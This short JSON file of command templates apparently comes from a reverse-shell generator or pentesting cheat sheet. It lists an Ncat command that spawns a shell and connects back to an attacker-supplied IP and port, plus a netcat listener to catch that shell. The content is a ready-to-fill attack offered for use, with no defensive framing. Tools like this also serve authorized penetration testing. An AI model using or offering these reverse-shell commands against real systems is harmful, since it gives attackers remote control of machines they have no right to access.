{
  "commands": [
    {
      "title": "Ncat -e reverse shell",
      "template": "ncat {ip} {port} -e sh",
      "description": "Uses Ncat to spawn a shell and connect back to the attacker."
    },
    {
      "title": "Netcat Listener",
      "template": "nc -lvnp {port}"
    }
  ]
}
